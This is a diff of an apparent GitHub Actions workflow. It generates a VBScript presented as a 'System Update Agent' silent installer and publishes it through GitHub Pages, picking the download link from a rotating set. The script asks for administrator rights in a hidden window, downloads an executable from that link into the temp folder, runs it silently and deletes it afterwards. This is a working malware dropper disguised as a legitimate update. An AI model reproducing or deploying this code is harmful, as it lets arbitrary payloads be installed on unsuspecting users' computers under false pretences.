@@ -27,138 +27,142 @@ jobs:
         echo "Link index: $link_index"
         echo "Creating installer with link: $current_link"
         
-        # Create the VBS script with echo statements to prevent errors
+        # Create the VBS script using printf to avoid quote escaping issues
         echo 'Creating VBS script...'
-        echo '' > installer.vbs
-        echo '' >> installer.vbs
-        echo "' --------------------------------------------------------------------------" >> installer.vbs
-        echo "'  System Update Agent - Silent Installer" >> installer.vbs
-        echo "' --------------------------------------------------------------------------" >> installer.vbs
-        echo "Option Explicit" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Constants" >> installer.vbs
-        echo "Const TEMP_FOLDER = 2" >> installer.vbs
-        echo "Const OVERWRITE = 2" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Global objects" >> installer.vbs
-        echo "Dim objShell, objFSO, objNetwork" >> installer.vbs
-        echo "Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
-        echo "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
-        echo "Set objNetwork = CreateObject(\"WScript.Network\")" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Check for admin privileges" >> installer.vbs
-        echo "If Not IsAdmin() Then" >> installer.vbs
-        echo "    ElevateScript()" >> installer.vbs
-        echo "    WScript.Quit" >> installer.vbs
-        echo "End If" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "' Main execution" >> installer.vbs
-        echo "Main()" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Sub Main()" >> installer.vbs
-        echo "    Dim downloadUrl, tempPath, installerPath, result" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Configuration" >> installer.vbs
-        echo "    downloadUrl = \"$current_link\"" >> installer.vbs
-        echo "    tempPath = objFSO.GetSpecialFolder(TEMP_FOLDER).Path" >> installer.vbs
-        echo "    installerPath = tempPath & \"\\sysupdate.exe\"" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Log the start" >> installer.vbs
-        echo "    LogEvent \"Starting installation from: \" & downloadUrl" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Download the installer" >> installer.vbs
-        echo "    result = DownloadFile(downloadUrl, installerPath)" >> installer.vbs
-        echo "    If Not result Then" >> installer.vbs
-        echo "        LogEvent \"Failed to download installer\"" >> installer.vbs
-        echo "        Exit Sub" >> installer.vbs
-        echo "    End If" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Execute the installer silently" >> installer.vbs
-        echo "    LogEvent \"Executing installer: \" & installerPath" >> installer.vbs
-        echo "    ExecuteInstaller installerPath" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Cleanup" >> installer.vbs
-        echo "    If objFSO.FileExists(installerPath) Then" >> installer.vbs
-        echo "        objFSO.DeleteFile installerPath, True" >> installer.vbs
-        echo "        LogEvent \"Installer file cleaned up\"" >> installer.vbs
-        echo "    End If" >> installer.vbs
-        echo "End Sub" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Function IsAdmin()" >> installer.vbs
-        echo "    On Error Resume Next" >> installer.vbs
-        echo "    IsAdmin = (objShell.RegRead(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\") = 1)" >> installer.vbs
-        echo "    If Err.Number <> 0 Then IsAdmin = True" >> installer.vbs
-        echo "    On Error GoTo 0" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Sub ElevateScript()" >> installer.vbs
-        echo "    Dim scriptPath, args" >> installer.vbs
-        echo "    scriptPath = \"\"\"\" & WScript.ScriptFullName & \"\"\"" >> installer.vbs
-        echo "    args = \"/elevated\"" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    LogEvent \"Requesting elevation\"" >> installer.vbs
-        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", scriptPath & \" \" & args, \"\", \"runas\", 0" >> installer.vbs
-        echo "End Sub" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Function DownloadFile(url, destination)" >> installer.vbs
-        echo "    On Error Resume Next" >> installer.vbs
-        echo "    Dim objHTTP, objStream, finalUrl" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    LogEvent \"Downloading from: \" & url" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> installer.vbs
-        echo "    objHTTP.Open \"GET\", url, False" >> installer.vbs
-        echo "    objHTTP.Send" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Check for redirect (301, 302, etc.)" >> installer.vbs
-        echo "    If objHTTP.Status >= 300 And objHTTP.Status < 400 Then" >> installer.vbs
-        echo "        finalUrl = objHTTP.getResponseHeader(\"Location\")" >> installer.vbs
-        echo "        LogEvent \"Redirect detected to: \" & finalUrl" >> installer.vbs
-        echo "        objHTTP.Open \"GET\", finalUrl, False" >> installer.vbs
-        echo "        objHTTP.Send" >> installer.vbs
-        echo "    End If" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    If objHTTP.Status <> 200 Then" >> installer.vbs
-        echo "        LogEvent \"Download failed with status: \" & objHTTP.Status" >> installer.vbs
-        echo "        DownloadFile = False" >> installer.vbs
-        echo "        Exit Function" >> installer.vbs
-        echo "    End If" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Set objStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
-        echo "    objStream.Type = 1 ' Binary" >> installer.vbs
-        echo "    objStream.Open" >> installer.vbs
-        echo "    objStream.Write objHTTP.ResponseBody" >> installer.vbs
-        echo "    objStream.SaveToFile destination, OVERWRITE" >> installer.vbs
-        echo "    objStream.Close" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    LogEvent \"Download completed to: \" & destination" >> installer.vbs
-        echo "    DownloadFile = (Err.Number = 0)" >> installer.vbs
-        echo "End Function" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Sub ExecuteInstaller(installerPath)" >> installer.vbs
-        echo "    Dim command" >> installer.vbs
-        echo "    command = \"\"\"\" & installerPath & \"\"\" /S /D=\" & objShell.ExpandEnvironmentStrings(\"%ProgramFiles%\")" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    LogEvent \"Running command: \" & command" >> installer.vbs
-        echo "    objShell.Run command, 0, True" >> installer.vbs
-        echo "    LogEvent \"Installer execution completed\"" >> installer.vbs
-        echo "End Sub" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "Sub LogEvent(message)" >> installer.vbs
-        echo "    ' Log to Windows Application Event Log" >> installer.vbs
-        echo "    objShell.LogEvent 1, \"System Update Agent: \" & message" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    ' Also log to a file for debugging" >> installer.vbs
-        echo "    Dim logFile, logPath" >> installer.vbs
-        echo "    logPath = objShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
-        echo "    logFile = logPath & \"\\sysupdate.log\"" >> installer.vbs
-        echo "    " >> installer.vbs
-        echo "    Dim objFSO, objTextStream" >> installer.vbs
-        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
-        echo "    Set objTextStream = objFSO.OpenTextFile(logFile, 8, True) ' 8 = ForAppending" >> installer.vbs
-        echo "    objTextStream.WriteLine Now & \" - \" & message" >> installer.vbs
-        echo "    objTextStream.Close" >> installer.vbs
-        echo "End Sub" >> installer.vbs
+        printf '%s\n' \
+        '' \
+        "' --------------------------------------------------------------------------" \
+        "'  System Update Agent - Silent Installer" \
+        "' --------------------------------------------------------------------------" \
+        "Option Explicit" \
+        "" \
+        "' Constants" \
+        "Const TEMP_FOLDER = 2" \
+        "Const OVERWRITE = 2" \
+        "" \
+        "' Global objects" \
+        "Dim objShell, objFSO, objNetwork" \
+        "Set objShell = CreateObject(\"WScript.Shell\")" \
+        "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" \
+        "Set objNetwork = CreateObject(\"WScript.Network\")" \
+        "" \
+        "' Check for admin privileges" \
+        "If Not IsAdmin() Then" \
+        "    ElevateScript()" \
+        "    WScript.Quit" \
+        "End If" \
+        "" \
+        "' Main execution" \
+        "Main()" \
+        "" \
+        "Sub Main()" \
+        "    Dim downloadUrl, tempPath, installerPath, result" \
+        "    " \
+        "    ' Configuration" \
+        "    downloadUrl = \"$current_link\"" \
+        "    tempPath = objFSO.GetSpecialFolder(TEMP_FOLDER).Path" \
+        "    installerPath = tempPath & \"\\sysupdate.exe\"" \
+        "    " \
+        "    ' Log the start" \
+        "    LogEvent \"Starting installation from: \" & downloadUrl" \
+        "    " \
+        "    ' Download the installer" \
+        "    result = DownloadFile(downloadUrl, installerPath)" \
+        "    If Not result Then" \
+        "        LogEvent \"Failed to download installer\"" \
+        "        Exit Sub" \
+        "    End If" \
+        "    " \
+        "    ' Execute the installer silently" \
+        "    LogEvent \"Executing installer: \" & installerPath" \
+        "    ExecuteInstaller installerPath" \
+        "    " \
+        "    ' Cleanup" \
+        "    If objFSO.FileExists(installerPath) Then" \
+        "        objFSO.DeleteFile installerPath, True" \
+        "        LogEvent \"Installer file cleaned up\"" \
+        "    End If" \
+        "End Sub" \
+        "" \
+        "Function IsAdmin()" \
+        "    On Error Resume Next" \
+        "    IsAdmin = (objShell.RegRead(\"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\") = 1)" \
+        "    If Err.Number <> 0 Then IsAdmin = True" \
+        "    On Error GoTo 0" \
+        "End Function" \
+        "" \
+        "Sub ElevateScript()" \
+        "    Dim scriptPath, args" \
+        "    scriptPath = \"\"\"\" & WScript.ScriptFullName & \"\"\"" \
+        "    args = \"/elevated\"" \
+        "    " \
+        "    LogEvent \"Requesting elevation\"" \
+        "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", scriptPath & \" \" & args, \"\", \"runas\", 0" \
+        "End Sub" \
+        "" \
+        "Function DownloadFile(url, destination)" \
+        "    On Error Resume Next" \
+        "    Dim objHTTP, objStream, finalUrl" \
+        "    " \
+        "    LogEvent \"Downloading from: \" & url" \
+        "    " \
+        "    Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")" \
+        "    objHTTP.Open \"GET\", url, False" \
+        "    objHTTP.Send" \
+        "    " \
+        "    ' Check for redirect (301, 302, etc.)" \
+        "    If objHTTP.Status >= 300 And objHTTP.Status < 400 Then" \
+        "        finalUrl = objHTTP.getResponseHeader(\"Location\")" \
+        "        LogEvent \"Redirect detected to: \" & finalUrl" \
+        "        objHTTP.Open \"GET\", finalUrl, False" \
+        "        objHTTP.Send" \
+        "    End If" \
+        "    " \
+        "    If objHTTP.Status <> 200 Then" \
+        "        LogEvent \"Download failed with status: \" & objHTTP.Status" \
+        "        DownloadFile = False" \
+        "        Exit Function" \
+        "    End If" \
+        "    " \
+        "    Set objStream = CreateObject(\"ADODB.Stream\")" \
+        "    objStream.Type = 1 ' Binary" \
+        "    objStream.Open" \
+        "    objStream.Write objHTTP.ResponseBody" \
+        "    objStream.SaveToFile destination, OVERWRITE" \
+        "    objStream.Close" \
+        "    " \
+        "    LogEvent \"Download completed to: \" & destination" \
+        "    DownloadFile = (Err.Number = 0)" \
+        "End Function" \
+        "" \
+        "Sub ExecuteInstaller(installerPath)" \
+        "    Dim command" \
+        "    command = \"\"\"\" & installerPath & \"\"\" /S /D=\" & objShell.ExpandEnvironmentStrings(\"%ProgramFiles%\")" \
+        "    " \
+        "    LogEvent \"Running command: \" & command" \
+        "    objShell.Run command, 0, True" \
+        "    LogEvent \"Installer execution completed\"" \
+        "End Sub" \
+        "" \
+        "Sub LogEvent(message)" \
+        "    ' Log to Windows Application Event Log" \
+        "    objShell.LogEvent 1, \"System Update Agent: \" & message" \
+        "    " \
+        "    ' Also log to a file for debugging" \
+        "    Dim logFile, logPath" \
+        "    logPath = objShell.ExpandEnvironmentStrings(\"%TEMP%\")" \
+        "    logFile = logPath & \"\\sysupdate.log\"" \
+        "    " \
+        "    Dim objFSO, objTextStream" \
+        "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" \
+        "    Set objTextStream = objFSO.OpenTextFile(logFile, 8, True) ' 8 = ForAppending" \
+        "    objTextStream.WriteLine Now & \" - \" & message" \
+        "    objTextStream.Close" \
+        "End Sub" > installer.vbs
+        
+        # Replace the placeholder URL with the actual link
+        echo "Replacing placeholder URL with actual link"
+        sed -i "s|\\\$current_link|$current_link|g" installer.vbs
         
         # Create index.html for GitHub Pages
         echo "Creating index.html for GitHub Pages"
